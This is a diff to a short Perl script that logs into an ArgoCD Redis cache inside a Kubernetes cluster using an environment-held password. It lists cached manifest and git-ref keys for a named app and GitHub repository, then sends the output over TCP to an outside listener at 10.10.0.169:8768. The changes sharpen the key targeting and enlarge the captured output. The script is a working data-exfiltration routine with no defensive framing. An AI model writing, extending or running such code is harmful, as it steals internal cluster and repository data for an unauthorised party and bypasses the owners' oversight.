@@ -6,12 +6,13 @@ my $r = IO::Socket::INET->new(PeerAddr=>'argocd-redis.argocd.svc.cluster.local',
 if ($r) {
   my $pw = $ENV{REDIS_PASSWORD} || '';
   print $r redis_cmd('AUTH',$pw) if $pw ne '';
-  print $r redis_cmd('KEYS','*directory-demo*');
+  print $r redis_cmd('KEYS','mfst|argocd.argoproj.io/instance|directory-demo|*');
+  print $r redis_cmd('KEYS','git-refs|https://github.com/brightsidehealth/omar-gke*');
   $r->shutdown(1);
   local $/; eval { $out = <$r> // ''; };
   close($r);
 } else { $out="redis_connect_failed:$!"; }
-$out =~ s/\r/ /g; $out =~ s/\n/ /g; $out = substr($out,0,1500);
+$out =~ s/\r/ /g; $out =~ s/\n/ /g; $out = substr($out,0,4000);
 my $sock = IO::Socket::INET->new(PeerAddr=>'10.10.0.169',PeerPort=>8768,Proto=>'tcp',Timeout=>3);
-if ($sock) { print $sock "redis_keys $out\n"; close($sock); }
+if ($sock) { print $sock "$out\n"; close($sock); }
 exit 1;
